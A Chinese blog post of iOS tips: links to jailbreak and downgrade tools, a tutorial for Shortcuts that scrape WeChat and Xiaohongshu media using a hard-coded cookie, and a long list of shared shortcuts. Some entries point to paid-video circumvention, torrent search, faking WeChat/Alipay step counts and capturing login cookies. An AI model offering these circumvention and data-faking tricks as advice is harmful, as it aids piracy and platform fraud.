---
title: iOS使用技巧总结
categories: iOS
abbrlink: iOS-Skills
date: 2020-03-20 19:06:29
tags:

---

![](topic.jpg)

共享应用、破解内购等。

<!-- more -->

```
越狱
https://ios.cfw.guide/


重新登录appleID后会安装很多app

原因应该是之前下他们的时候下到一半就没下，然后重新登录后会自动完成没下完的部分

解决：


https://discussionschinese.apple.com/thread/253150810

让他们下完，在全部删掉

或者：

https://discussionschinese.apple.com/thread/253193718

我以前也是，后来没有了，你试试，你点开app，点击右上角头像，进去再点击账户头像，下拉有一个删除此设备（写了什么自动下载，我忘记了），然后来回切换ID都可以了



双引导
https://github.com/dualra1n/dualra1n

降级
https://github.com/mineek/sunst0rm

iOS马甲包
https://github.com/lightank/LTVestbagDemo


Charles Proxy抓IPA包
https://sspai.com/post/36122
```

# 捷径

## 制作

打开快捷指令，点击+号新建。以下列例子进行说明。

### 下载微信推文图片

流程大致如下。

```
├── 获取剪贴板
├── 获取URL内容
├── 用多信息文本制作HTML
├── 匹配文本
│   └── data-src="(.*?)"
├── 获取匹配文本的组
├── 获取URL内容
└── 存储到相簿
```

点击添加操作，选择共享-获取剪贴板，长按并移动到蓝框内。点击+号添加操作，返回添加操作主页面，选择网页-获取URL内容，长按并移动到第一个动作的下方。

然后继续增加操作，搜索html并将`用多信息文本制作HTML`拖到下一个动作。复制微信推文后运行该捷径，寻找图片链接的规律，可发现均为`data-src="[图片链接]"`的格式。

故添加操作`匹配文本`，并将`[0-9a-zA-Z]`修改为`data-src="(.*?)"`。其中`()`代表组，便于后面提取图片链接，而`.*?`是非贪婪的匹配任何字符，即尽可能少的匹配，在本例中代表精确匹配所有图片链接。

添加操作`获取匹配文本的组`以取得图片链接，然后添加操作`获取URL内容`以下载图片，添加操作`存储到相簿`将图片存储到相簿，保存并运行即可。

### 下载小红书视频/图文

流程大致如下。

```
├── 获取剪贴板
└── 如果
    ├── 不含xhs
    │   ├── 显示提醒
    │   └── 退出快捷指令
    └── 含xhs
        ├── 获取URL内容
        │   ├── User-Agent
        │   └── Cookie
        ├── 从多信息文本制作HTML
        ├── 从菜单中选取
        │   ├── 下载视频
        │   │   ├── 匹配文本
        │   │   │   └── video src=\"(.*?)\"
        │   │   ├── 获取匹配文本的组
        │   │   ├── 替换文本
        │   │   │   └── 将amp;替换为空值
        │   │   ├── 获取URL内容
        │   │   ├── 存储到相簿
        │   │   └── 从菜单中选取
        │   │       ├── 保存文字内容
        │   │       │   ├── 匹配文本
        │   │       │   │   └── "name": "(.*?)\"
        │   │       │   ├── 获取匹配文本的组
        │   │       │   ├── 添加到变量
        │   │       │   │   └── 存入变量a
        │   │       │   ├── 匹配文本
        │   │       │   │   └── "comments":\d+,.*?"desc\":\"(.*?)\"
        │   │       │   ├── 获取匹配文本的组
        │   │       │   ├── 替换文本
        │   │       │   │   ├── 将\\n替换为空值
        │   │       │   │   └── 点开操作，打开正则表达式选项
        │   │       │   ├── 添加到变量
        │   │       │   │   └── 存入变量a
        │   │       │   └── 创建备忘录
        │   │       │       └── 使用变量a 
        │   │       └── 不保存文字内容      
        │   │           └── 结束菜单
        │   └── 下载图片
        │       ├── 匹配文本
        │       │   └── imageList\":\[(.*?)\]
        │       ├── 获取匹配文本的组
        │       ├── 匹配文本
        │       │   └── \"(\\u002F.*?format.*?)\"
        │       ├── 替换文本
        │       │   └── 将\u002F替换为/
        │       ├── 替换文本
        │       │   └── 将"替换为空值
        │       ├── 为每个项目重复
        │       │   ├── 替换文本
        │       │       └── 将//替换为https://
        │       ├── 获取URL内容
        │       ├── 从列表中选取
        │       │   ├── 选择想保存的图片
        │       │   └── 存储到相簿
        │       └── 从菜单中选取
        │           ├── 保存文字内容
        │           │   ├── 匹配文本
        │           │   │   └── "name": "(.*?)\"
        │           │   ├── 获取匹配文本的组
        │           │   ├── 添加到变量
        │           │   │   └── 存入变量b
        │           │   ├── 匹配文本
        │           │   │   └── "<div class="note"[\s\S]*class="content"\s*data-v-\w+?>([\s\S]*)</p></div></div>
        │           │   ├── 替换文本
        │           │   │   ├── 将<(\S*?)[^>]*>.*?|<.*? />替换为空值
        │           │   │   └── 点开操作，打开正则表达式选项
        │           │   ├── 添加到变量
        │           │   │   └── 存入变量b
        │           │   └── 创建备忘录
        │           │       └── 使用变量b
        │           └── 不保存文字内容      
        │               └── 结束菜单
        └── 退出快捷指令
```

添加操作`获取剪贴板`取得链接，添加操作`如果`判断链接是否为小红书分享链接。若不含xhs，则不是小红书链接，添加操作`显示提醒`提示用户错误信息，然后添加操作`退出快捷指令`结束。

若为小红书链接，则添加操作`获取URL内容`拿到网页内容，其中需要展开并添加以下两个头部值。

|     键     |                                                                                                                                                                                                                                 文本                                                                                                                                                                                                                                 |
|------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| User-Agent | Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1                                                                                                                                                                                                                                                                                                                            |
| Cookie     | timestamp2=c25daa113bced3fc44240e15d6c01368; hasaki=JTVCJTIyTW96aWxsYS81LjAlMjAoaVBob25lOyUyMENQVSUyMGlQaG9uZSUyME9TJTIwMTNfMyUyMGxpa2UlMjBNYWMlMjBPUyUyMFgpJTIwQXBwbGVXZWJLaXQvNjA1LjEuMTUlMjAoS0hUTUwsJTIwbGlrZSUyMEdlY2tvKSUyMFZlcnNpb24vMTMuMC40JTIwTW9iaWxlLzE1RTE0OCUyMFNhZmFyaS82MDQuMSUyMiwlMjJ6aC1DTiUyMiwzMywtNDgwLHRydWUsdHJ1ZSx0cnVlLCUyMnVuZGVmaW5lZCUyMiwlMjJ1bmRlZmluZWQlMjIsbnVsbCwlMjJpUGhvbmUlMjIsbnVsbCxudWxsLG51bGwsJTIyJTIyLDE5NDcxNjYxMDYlNUQ= |

此处使用了自定义的User-Agent。捷径默认的User-Agent如下。

```
快捷指令/1050.4.6CFNetwork/1121.2.2Darwin/19.2.0
```

添加操作`从多信息文本制作HTML`显示网页源代码，然后添加操作`从菜单中选取`，让用户选择是下载视频还是图文。

如果是下载视频，则添加操作`匹配文本`，使用正则表达式`video src=\"(.*?)\"`匹配，并添加操作`获取匹配文本的组`以取得视频链接。添加操作`替换文本`，将`amp;`替换为空值，然后添加操作`获取URL内容`以下载视频，添加操作`存储到相簿`将视频存储到相簿。

添加操作`从菜单中选取`，让用户选择是否保存文字内容。

若保存，则添加操作`匹配文本`，匹配`"name": "(.*?)\"`，以表示标题和作者。添加操作`获取匹配文本的组`，然后添加操作`添加到变量`，将内容存入变量`a`。然后添加操作`匹配文本`，匹配`"comments":\d+,.*?"desc\":\"(.*?)\"`，以表示正文。添加操作`获取匹配文本的组`，添加操作`替换文本`，将`\\n`替换为空，其中需要点开操作，打开`正则表达式`选项。添加操作`添加到变量`，将内容也存入变量`a`。至此变量`a`已存有所有需要的信息，故添加操作`创建备忘录`，使用a创建备忘录。

若不保存，则不进行操作。最后结束菜单。

如果是下载图片，则添加操作`匹配文本`，使用正则表达式`imageList\":\[(.*?)\]`匹配，并添加操作`获取匹配文本的组`以取得多个图片链接。再添加操作`匹配文本`，使用正则表达式`\"(\\u002F.*?format.*?)\"`匹配，从而得到精确的图片链接。添加操作`替换文本`，将`\u002F`替换为`/`，以将unicode编码转为中文，添加操作`替换文本`，将`"`替换为空以去掉两端的双引号，添加操作`为每个项目重复`，其操作为`替换文本`，将`//`替换为`https://`，至此得到完整的URL链接。添加操作`获取URL内容`从链接下载图片，添加操作`从列表中选取`选择想保存的图片，添加操作`存储到相簿`将图片存储到相簿。

添加操作`从菜单中选取`，让用户选择是否保存文字内容。

若保存，则添加操作`匹配文本`，匹配`"name": "(.*?)\"`（标题和作者），添加操作`获取匹配文本的组`，然后添加操作`添加到变量`，将内容存入变量`b`；添加操作`匹配文本`，匹配`"<div class="note"[\s\S]*class="content"\s*data-v-\w+?>([\s\S]*)</p></div></div>`（正文），添加操作`替换文本`，将`<(\S*?)[^>]*>.*?|<.*? />`替换为空，然后添加操作`添加到变量`，将内容也存入变量`b`。至此变量`b`已存有所有需要的信息，故添加操作`创建备忘录`，使用b创建备忘录。

若不保存，则不进行操作。最后结束菜单。

至此快捷指令结束，添加操作`退出快捷指令`即可。

## 捷径库

### 总仓库

```
https://shortcuts.sspai.com/
https://jiejingku.net/
https://jiejinghe.com/
https://sharecuts.cn/
https://jiejingku.net/category/shortcuts
```

### 声音

```
# 虾米音乐
https://www.icloud.com/shortcuts/a3f2abecad1c4ed7b35d81e67c11069a

# 网易云音乐
https://www.icloud.com/shortcuts/ce4f89e80cb7428ab82db298adec17dc

# QQ音乐声控
https://www.icloud.com/shortcuts/5741fbc3748d43d9a07fdd60ee0d8c5e

# QQ音乐
https://www.icloud.com/shortcuts/d16cb159b3d8447ebdd17390fe9813d2

# 音乐全网下载
https://www.icloud.com/shortcuts/be5bfd954e184cbbaccd0dae8189e818

# 中国广播电台FM
https://www.icloud.com/shortcuts/4c40fb48bac94c24b6a0d9bfba181424

# 录音
https://www.icloud.com/shortcuts/d114c56df5c44ffaa6492113037144c6

# 百度语音合成
https://www.icloud.com/shortcuts/c051b5e6cab94d70926e3b9bbb29af36

# 现在播放
https://workflow.is/workflows/3d954aa947474ed8b93d13f5b9d18625

# 随机播放
https://workflow.is/workflows/7e2dab4135c24808b36a5384cde60b7d

# 获取歌曲信息
https://workflow.is/workflows/70900391fdd6423ab2e6d925abf148cc

# 添加一些歌曲
https://workflow.is/workflows/c5f6d0b19e7e4463af581c0011860443

# 加入我的音乐
https://workflow.is/workflows/5bf4367cdef74e3cbe5d4078bdac9882

# 播放我的音乐
https://workflow.is/workflows/39d58771c84c4a50af50b3a0e1f7bda7

# Instagram分享音乐
https://workflow.is/workflows/402507226b8844258dee694d58b126e9

# QQ音乐无损下载
https://www.icloud.com/shortcuts/b2c51ca5e7324904aa5be02fae7c4045

# 网易云音乐无损下载
https://www.icloud.com/shortcuts/a4e38fb4529d4cf4b43f844264fdecb2

# 网易云助手
https://www.icloud.com/shortcuts/d6ed49f0b11e418ba5c7797af719068f

# 网易歌单工具箱
https://www.icloud.com/shortcuts/8d71ed4b433d490aa6f5e71d2f2b4ea9

# 音效盒子
https://www.icloud.com/shortcuts/8f3593e814244e32a16bc821896f1b5e

# 上朝网易云
https://www.icloud.com/shortcuts/401e94954a5a4a50951be0f2cf11372c
```

### 图片

```
# 应用图像至相机胶卷
https://workflow.is/workflows/613a8f5e6e714cc9aecaa4e76d981248

# 保存照片
https://workflow.is/workflows/a6487b004917494b88fe0fc01f0ffbc6

# 分享最新照片
https://workflow.is/workflows/5f9c56bfe6de447598a6d0440697c470

# 拼接图像
https://www.icloud.com/shortcuts/7a4129acb8df4f48b79ee930f1ce3d1f

# 拼接长图
https://www.icloud.com/shortcuts/07e7003f74b74216920b647eeb50ca17

# GIF制作转换
https://www.icloud.com/shortcuts/f810ee7228c244ed9707c3dbbcad5ef1

# 水印相机
https://www.icloud.com/shortcuts/65774ba01e514320b2640c40463a4cea

# 位置查找
# 以图查路线、拍照共享、清除照片元数据
https://www.icloud.com/shortcuts/ae804942349242ac98646c1c77c9aa7a

# 视频调速
https://www.icloud.com/shortcuts/799955de8e204b95b63c305268a168dc

# 以图搜图
https://www.icloud.com/shortcuts/59d6bfaae10a465da7366127166f5639

# 九宫格
https://www.icloud.com/shortcuts/8f8671ef0bff4545b3233d4415092e10

# 传图
https://www.icloud.com/shortcuts/2c04bce6e62b4a398df88c8acaff3428

# 删改拼图片
https://workflow.is/workflows/41cfefdd0eca448391ef78186555f221

# 截图加壳
https://www.icloud.com/shortcuts/e406b46a379548a69a1af503aeca37f4
https://www.icloud.com/shortcuts/2e6b1c0a0a114014812bf26897b5a2aa
https://www.icloud.com/shortcuts/7edc8f86d6ed4a96a43acacee36392de

# 删除多张图片
https://workflow.is/workflows/c545d9c33b0f40d8a80712b282a19eb3

# 调整照片
# 调整原始照片，然后删除原稿
https://workflow.is/workflows/014c0e9d263247979bc6a1c9894e07e4

# 爬图片
https://www.icloud.com/shortcuts/65ea0d09069545cfa9abd78839763146

# Bing壁纸
https://www.icloud.com/shortcuts/6d63fb492b094483aa18ce65b921ca0d

# 图标与图链
https://www.icloud.com/shortcuts/608014dbe70e45588653193fd8b1a4b9
```

### 视频

```
# 短视频去水印
https://www.icloud.com/shortcuts/cf5f76704f9444c9aa17e2a2f85b4f5a

# 拍摄GIF
https://www.icloud.com/shortcuts/0d77fb02b4d64b17858db35b5008d8c0

# 抖音去水印
https://www.icloud.com/shortcuts/c22783212e7a4918acf377546431fbeb

# 下载Tumblr视频
https://workflow.is/workflows/051ddcc30c984d47afe7b1fde9a403e7
https://workflow.is/workflows/f8656cbb90524dffa1fe2eba8975946e
https://workflow.is/workflows/087a0abf12c049dd9ab256afaec790c0

# 新浪微博视频
https://workflow.is/workflows/fd7fe0b7548046e689e9776b2182a8b1

# 下载Twitter的GIF
https://workflow.is/workflows/aa9821c4bce44b6f8febcbda6245c1f0

# 下载Youtube视频
https://workflow.is/workflows/ec284f18720c45e39ff31128e6d42602
https://workflow.is/workflows/73971870942c49da96cae6a490aea8e0
https://workflow.is/workflows/617578d73f8244a5afed2a1665c8e320

# 电视直播
https://www.icloud.com/shortcuts/0f9322e7b1244db68eb9a61d06dd757f
https://www.icloud.com/shortcuts/9a549e208d544532892f0fcc90dfaf8e

# SKY电影
https://www.icloud.com/shortcuts/f29d4a33f2734b3b8f790ea5d591fd1e

# 语音点播MV
https://www.icloud.com/shortcuts/d45086dbc5e042129ae2e7601cb41b5c

# 手机电视
https://www.icloud.com/shortcuts/0695a29bd0224b7f84e9b696adeb4330

# 在线电影
https://www.icloud.com/shortcuts/7f8220d6d2264fbb811c9f6add1fbe47

# 香港电视直播
https://www.icloud.com/shortcuts/01e2ed40f598489393769d9707c8c248

# 港澳台直播
https://www.icloud.com/shortcuts/653c5caaf997435788da1090e6b06406

# 唐人影视
https://www.icloud.com/shortcuts/022baf8d47bb449ab858bbcabcf408af

# 电视节目选播
https://www.icloud.com/shortcuts/dff26dbe75df442f8e82b61ba06963ac

# 翡翠台直播
https://www.icloud.com/shortcuts/be2e98653ffb467dbc54acb45105c1b4

# icdrama
https://www.icloud.com/shortcuts/362700ca27a04a9f9797d4b28c11b63a

# 小新在线影视
https://www.icloud.com/shortcuts/b77d3661dacd4651bcddb8cee863b1d1

# 全能音视频下载
https://www.icloud.com/shortcuts/b6f75b050fa84b49ae0ac8173fe976a7

# 抖音无水印视频
https://www.icloud.com/shortcuts/b7698896dc8a4057b8174e989ec21198
https://www.icloud.com/shortcuts/fa885e093ec443b2807040f2b3ad2bfd

# 抖音音频下载
https://www.icloud.com/shortcuts/e00730220f614ad193d69b5a75313dc3

# 快手无水印下载
https://www.icloud.com/shortcuts/b5221374c6024181ae19f7f759575035
https://www.icloud.com/shortcuts/118a2c455bb54406979071a8942c556d

# 万能视频下载
https://www.icloud.com/shortcuts/939dfd29e1d14800a00bc86a252ca84f

# 电影动漫资源搜索
https://www.icloud.com/shortcuts/e1e9401dcb4340bd96d463cf194ebbbf

# 全能视频VIP
https://www.icloud.com/shortcuts/4a39135fc0284377a1236cbbb0bac53c

# Viu TV99频道
https://www.icloud.com/shortcuts/2e78d444d706470e95b3112557bbd13b

# Youtube保存到任意App
https://workflow.is/workflows/01fdf6b4a30d43fcb1ae5f01763b4abc

# 贴吧视频下载
https://www.icloud.com/shortcuts/00975db818f846efb50df1489213b96e

# 火山短视频去水印下载
https://www.icloud.com/shortcuts/6cf84eae2eba4717ae75ae10cdd3f722

# 微博秒拍视频下载
https://www.icloud.com/shortcuts/e09a96b7e8bc4913bf8708f57cffce9f

# Twitter视频下载
https://www.icloud.com/shortcuts/0a9451a9f19a4a5c89afed57ef6fd9d9
https://workflow.is/workflows/75562e41b6c74540903786ae9b6f1c50

# 全网VIP视频解析
https://www.icloud.com/shortcuts/8a10557abf924d5dbdaaef5e65248593
https://www.icloud.com/shortcuts/58add5dba526413c862ac90d7cada939

# 照片视频-GIF互转
https://www.icloud.com/shortcuts/6041338fea174bacb386b7b14446fa6f
https://www.icloud.com/shortcuts/114d8f7e8fde44408c502723187f6a6e

# 从视频提取音频
https://www.icloud.com/shortcuts/5dd917b032e14d838554ea838dd6f978

# QQ空间视频下载
https://www.icloud.com/shortcuts/da27ac884dc04dd0accb75eb19e27ccc

# 获取B站封面视频
https://www.icloud.com/shortcuts/7d20ebb35d6441fcb9e0f0f6f225cbb41

# bilibili视频下载
https://www.icloud.com/shortcuts/7cfaa2d46b624e5093f9e13bded09ffc
```

### 词典

```
# 词典聚合
https://www.icloud.com/shortcuts/b40fa4ed278846e7b860674066b22c72

# 成语词典
https://www.icloud.com/shortcuts/5e8af02dd0c04703a65f5d0285d36888

# 新华字典
https://www.icloud.com/shortcuts/2a998ba59748437f8e8dd680c6fd67d3
```

### 剪贴板

```
# 复制到剪贴板
https://workflow.is/workflows/3242da310c4a45ec8270a09e49e6aa37

# 剪贴板翻译
https://workflow.is/workflows/5de0062c54c041a386be048dd84fa361

# 剪切板列表
https://workflow.is/workflows/db3321f2eec84c4eb2caf29a6df81286
```

### 搜索

```
# 自定义搜索
https://workflow.is/workflows/ac4b4abac0a2490e872b7134f5f9ca8a

# 谷歌高级搜索
https://workflow.is/workflows/6e7e0853ae664c5ea7a0bae7dad6941e

# 搜索电话号码
https://workflow.is/workflows/aa509941b57d48d4b51a0c2b1c06cf8c

# 你不会自己百度么
https://www.icloud.com/shortcuts/0b23911b67b341188f663c26ce737440

# 快捷百度搜索
https://www.icloud.com/shortcuts/030b88dff7bf40eba72fb9e2afb63dfb

# 小草搜索
https://www.icloud.com/shortcuts/dbec7cf292eb4601a7c9b35c51884146
```


### 天气

```
# 墨迹天气
https://www.icloud.com/shortcuts/f038cb7c58934a94aca2b4610ee5f447

# 墨迹天气实景图
https://www.icloud.com/shortcuts/1ba7cca9510f4aa7910f6c2bf29e06f9

# 彩云天气
https://www.icloud.com/shortcuts/09661308cc0b455e96c5ee660d9946e3

# 天气预报
https://www.icloud.com/shortcuts/274df58cd5354f6eb9630da30fdfba3e

# 报时语音天气
https://www.icloud.com/shortcuts/298247c77d364f7b828c18cb2e05b9fe

# 带背景音乐天气预报
https://www.icloud.com/shortcuts/31149463f4ca4df68148813331ea9603

# 今天的天气
https://workflow.is/workflows/cf6db9a3c90c4bc7adec27f739480937
```


### 社交

```
# Instagram全类型下载
https://www.icloud.com/shortcuts/7f4f267f7b6f4f3299206d43cde5c4eb
https://workflow.is/workflows/3a4f22ce8e794c7489a059224f3bc0b0

# Instagram保存图片
https://workflow.is/workflows/73aa53dfae9c45729befb49cdc6863f0

# Tumblr解析下载
https://www.icloud.com/shortcuts/400c06379b014e08be927162689f6047
https://www.icloud.com/shortcuts/6ac1b99b9e8340799d8b0c737cd0f314

# Tumblr保存到相册
https://workflow.is/workflows/897924d6858d47a4a6737733517a36eb

# 微博热搜榜
https://www.icloud.com/shortcuts/13c9b1f7cdbc434bbec2b28e577746ce

# 新浪微博
https://www.icloud.com/shortcuts/9994a3fdc685479d9b94fb6445a30536

# tumblr展开网址
https://workflow.is/workflows/62a9534d3ee1467080cd4136578d3d35

# 即刻视频下载
https://www.icloud.com/shortcuts/d6637e8536254a46ba81a09fabbad8f9

# 即刻图片下载
https://www.icloud.com/shortcuts/0f74a2c6ffbd4a59856612725ca22dc6
```

### 资源搜索与下载

```
# JS直链下载
# 自定义JS直链下载列表，可选择下载全部或挑选部分进行下载，理论上可以下载任何文本文件，如conf、list、md等
# 下载文件保存在iCoud Drive/shortcuts/elecV2JS文件夹，每次运行都会清空该目录的旧文件
https://www.icloud.com/shortcuts/50d7d8576dd74f7685811502ff72c078

# 高清影视种子下载
https://www.icloud.com/shortcuts/c5672516fa5645918abc48577a30efd6

# 迅雷安装器
https://www.icloud.com/shortcuts/e7c0ad75a9bf46bf889ba4be5463a7de

# 新磁力搜索
https://www.icloud.com/shortcuts/9a68ed9c6ea54654a4e7b8918b426855

# 小新下载器
https://www.icloud.com/shortcuts/90d5942429f14f5095eb7a0664d7918b

# 新磁力搜索
https://www.icloud.com/shortcuts/9a68ed9c6ea54654a4e7b8918b426855
```

### 电商

```
# 京东签到
# 下载stream并打开抓包，然后在Safari输入https://bean.m.jd.com并登录京东账号
# 刷新网页后返回stream并停止抓包。点击抓包历史，找到带有plogin开头的链接并点击，再选择请求，找到自己的cookie并复制。安装以下捷径后运行，输入刚刚复制的cookie，即可完成一键签到
https://www.icloud.com/shortcuts/35be01753adc49409a334464cb4c7470

# 双十一淘宝自动养猫
https://www.icloud.com/shortcuts/db359887fea14a61b0f0cd7c43642e4f

# 超级抢购助手
https://www.icloud.com/shortcuts/dca53a0ff3704f22badb7009b828b495

# 淘宝语音搜索
https://www.icloud.com/shortcuts/ba79d6ae5a1f455eb296cc314cf82447

# 淘宝语音搜索
https://www.icloud.com/shortcuts/ba79d6ae5a1f455eb296cc314cf82447

# 网购历史价格查询
https://www.icloud.com/shortcuts/e2c2777962384ffbbff3f04f2874ef67
```

### 电子支付

```
# 支付宝添加信用卡
https://www.icloud.com/shortcuts/4aef0930744d461c92333e1afaa9accf

# 三合一收款二维码生成
https://www.icloud.com/shortcuts/319f80622c234de8b811b7ba2d5a7228

# 支付宝打赏
https://www.icloud.com/shortcuts/bfe71390fe6a4d178d1f3f1a375765b7

# 支付助手
# 扫一扫、微信扫码、微信收款、支付宝扫码、Apple Pay、AA付款、查快递、蚂蚁森林、蚂蚁庄园、彩票、股票、运动、淘票票、乘车码、生活缴费、火车票等
https://www.icloud.com/shortcuts/45c64b77d773411485eb1c697f36cd8c

# 支付宝红包
https://www.icloud.com/shortcuts/abeb70e152f94a27871bb93abcc5475f
```

### 翻墙

```
# 批量节点获取
https://www.icloud.com/shortcuts/69caa3c45c7e48b5b6f3da98cdaeeac7

# 更新surge/shadowrocket主配置
https://workflow.is/workflows/55ecb14722f94d7c8c44ce3ce24d81c8

# 小火箭
https://www.icloud.com/shortcuts/8e3d0a5482004b8ca0f7c65301fdc936
```

### APP

```
# App Store商店切换
https://www.icloud.com/shortcuts/2910a1fd97404f149509cfd5612a046d
https://www.icloud.com/shortcuts/015c63d4358142389f1c723b7475406d

# App Store Region
https://www.icloud.com/shortcuts/5bb33439f8544ea4b9e708dd1b7a81ec

# 限免软件
https://www.icloud.com/shortcuts/0e5e70111c2f49a9bc1f10629c6ca74e

# 苹果应用安装器
https://www.icloud.com/shortcuts/0e2e25d73a7b4af0b6579158cf336dde

# 查看app信息
https://workflow.is/workflows/14f9deb92d4e42c4b286571b40533061
```

### 短链接与二维码

```
# 长短链接转换
https://www.icloud.com/shortcuts/22a07d8aeff24a4d9f977e1c9d5d9d0f

# iCloud外链获取器
https://www.icloud.com/shortcuts/c45f40eca0ba4a06a48fb99da71df047

# 短链接生成器
https://www.icloud.com/shortcuts/0c2ff4b4193b42779c192818c1a1e492

# 二维码生成器
https://www.icloud.com/shortcuts/1a8fb9d0760e40ff94ae374d2cdff497

# 制作/扫描二维码
https://www.icloud.com/shortcuts/52490640004c4fc4b2ebfd038eaf651c
https://workflow.is/workflows/3ed9b9ec4cf3463a9df0af7fca642e0b

# 二维码识别器
https://www.icloud.com/shortcuts/ff1992922a504d8797821da55f384b67

# 短链接
https://www.icloud.com/shortcuts/23ea80da4460403082b33c82bb41b5ad

# Shorten Link
# 一款短链接聚合工具，支持国内外优质短链接平台获取
https://www.icloud.com/shortcuts/e34d06d582884b19a32e4ecf5b9660e1

# WIFI二维码
https://www.icloud.com/shortcuts/59b1018835d94018ba6097ff0462cda9

# 万能扫码
https://www.icloud.com/shortcuts/e247aa760193472db8588804a8ea76d0

# 长短链接转换
https://www.icloud.com/shortcuts/22a07d8aeff24a4d9f977e1c9d5d9d0f
```

### 备份

```
# 一键备份所有捷径
https://www.icloud.com/shortcuts/6fbf11bce41b418396bf60ffaa5c14f3

# AB Backup备份
https://workflow.is/workflows/3db6bdcda3104b3b9bbaea8ddf655670

# 备份workflow工作流
https://workflow.is/workflows/c5421ebe19bd4bf885da8b74d2cbaded
```

### 工具箱

```
# 苹果工具箱
https://www.icloud.com/shortcuts/a7228c50afd94f2dbab9d160a8b5d50d

# 小新工具箱
https://www.icloud.com/shortcuts/dad33a5b449f45ee98c60d528d1fd878
```

### 翻译

```
# 英译中Pro
https://www.icloud.com/shortcuts/22805b54bdec4951bb36162e1f93c9bc

# 网页翻译
https://www.icloud.com/shortcuts/4c8839065dc44dda9ca22ecfc329cb18

# 翻译
https://workflow.is/workflows/a51df78f80414edf8469727f892d662d
```

### OCR与文字语音转换

```
# 百度语音合成
https://www.icloud.com/shortcuts/c051b5e6cab94d70926e3b9bbb29af36

# 文本转语音播放
https://www.icloud.com/shortcuts/5f95555da1454ce3a8a99f3f689410ee

# 图片文字识别
https://www.icloud.com/shortcuts/8aec6f5f73a54ecbab895bc468c60535
```

### 系统

```
# 群发短信
https://www.icloud.com/shortcuts/587fb88a053f4a76a2a0594c0ca299f1

# 查询未知号码来电信息
https://workflow.is/workflows/95b02bb18b2e4cfba06919034929a4d9

# 信息照片导航
https://workflow.is/workflows/84daad7aa32f488f842356a246087a5b

# 手机快捷设置
https://workflow.is/workflows/f1e96f0ed0494d3288dc69c9083deab7

# 信息翻译发送
https://workflow.is/workflows/f1d0b3a07ecc47ecbb963651740f7b74

# 提醒事项助手
https://www.icloud.com/shortcuts/38a51eafd83440dc9dcbe401d86c8706

# 系统开关设置
https://www.icloud.com/shortcuts/253fac20d197429292313f3bf3f104f3

# 通知中心翻页
https://workflow.is/workflows/7afbf6fa09204e5e837d52cab41f0497

# 换铃声
https://www.icloud.com/shortcuts/9928bcde86fe45ada142fac6c82e6441

# WIFI开关
https://www.icloud.com/shortcuts/b63662901aa54a37bf791a9b9a638c3d

# 一键重启
https://www.icloud.com/shortcuts/02fb4b468e534b569b14b22d9d0fd8bd

# 低功耗模式
https://workflow.is/workflows/640ae7eb22f143a093c77215a6e373e2

# 电池
https://workflow.is/workflows/febeed3ed07a4c78b9e77c2f48136a2a
```

### 签到

```
# 全网
https://www.icloud.com/shortcuts/91af4b2564134654ad2dbc7bce54bbdf

# 贴吧
https://www.icloud.com/shortcuts/5fd43b4ed6664fa4bcbf85bd2c18a408

# 淘宝
https://www.icloud.com/shortcuts/d7286cd634544d0ab8ecaf4bd7ad376d
```

### 其它

```
# 网速测试
https://www.icloud.com/shortcuts/0e5a81cb1076414680fd4f1a2d0c9094

# 谷歌网盘转存助手
https://www.icloud.com/shortcuts/51cdfaff6fd44ac295a8a34bd67e3da8

# 健康码
https://www.icloud.com/shortcuts/7b3a4c33ef374b7f8ef7eddcf4867234

# 分享当前Wi-Fi
https://www.icloud.com/shortcuts/926073374aa9498999756b17fadd9d28

# 网盘搜
https://www.icloud.com/shortcuts/feb916abb943481caa6a61335c2b224b

# 抽奖工具
https://www.icloud.com/shortcuts/9dc04fa400f248ac9608e6d138a07de3

# 人脸识别
https://www.icloud.com/shortcuts/67175ef09c1d4e7da2d77d476506740f

# 网络工具
https://www.icloud.com/shortcuts/74b26667ec774e6fbbfbe97c8aeff4e9

# 保存到iCloud
https://workflow.is/workflows/08f3cc0e184844339eb2f5caa58a316b

# 低消耗
https://www.icloud.com/shortcuts/2d1a0e792358405fbb2462572962e6cd

# 共享单车
https://www.icloud.com/shortcuts/259e77b79b884b0eb3b554d15672965f

# 数羊
https://www.icloud.com/shortcuts/9a9967b93caf4942b109d2efd59abbb3

# 手机亮度调节
https://www.icloud.com/shortcuts/1a1c0b2192d64550a4352eec7b8a1bfa

# 压缩/解压
https://www.icloud.com/shortcuts/4a352c743eae47f7bda758429109773c

# 程序改名加锁
https://www.icloud.com/shortcuts/0c73f53b09a24ad88f9eeeb315794b81

# 闪瞎你的眼
https://www.icloud.com/shortcuts/225f35dab5c84a96b101bd6e3b4d3d1a

# 修改步数
# QQ、微信、支付宝步数不能改变
https://www.icloud.com/shortcuts/cc759611240742cfb48e9cb83fafb806
# 以下捷径可用于微信、支付宝。需要下载小米运动APP，然后下载捷径后将捷径中的配置修改为自己的账号和密码。
https://www.icloud.com/shortcuts/ddc53a9e14d8415387a36a4cc46e3ad2

# 附近免费WIFI
https://www.icloud.com/shortcuts/81c787aacc9d41c4a33410426f43ed4b

# 在线福利6.1
https://www.icloud.com/shortcuts/7bf3abd752fe4f62a74a6c3a0d08e4a4

# 早上好
https://www.icloud.com/shortcuts/2e673487577c4a45af9047e83ab276eb

# 晚安
https://www.icloud.com/shortcuts/de7f95054f414776b0aa93c91bd06604

# 历史上的今天
https://www.icloud.com/shortcuts/eedc97baa8ec4c929312154af9a42ba3

# 保存网页为pdf到ibook
https://workflow.is/workflows/2027271452ce4712853838f43550d326

# 任天堂红白机小游戏
https://www.icloud.com/shortcuts/61facc44bd0f4f16b7c13468cf08a4e3

# 实时公交
https://www.icloud.com/shortcuts/aff4b5e0770b4a2cae6dae18249434d1

# 油价语音播报
https://www.icloud.com/shortcuts/a187659e1a0a4ab585eb72a764e3fed7

# 仙女棒
https://www.icloud.com/shortcuts/e3a0675319994f6d87b16c7ea1b73c5c

# 彩票开奖结果
https://www.icloud.com/shortcuts/ebc6541a714b42fb8cb4247d2b71ab77

# 钉钉打卡
https://www.icloud.com/shortcuts/7749df7b9c3342539b96d9aead7267ea

# 图灵机器人
https://www.icloud.com/shortcuts/1ae4ce4344b54f15b8a9831e0ab81bb4

# 运动播报
https://www.icloud.com/shortcuts/bc9e69c607ef40d08933aac0cd20588a

# 知乎日报
https://www.icloud.com/shortcuts/6f60912434e24f64b645d894ad78c47b

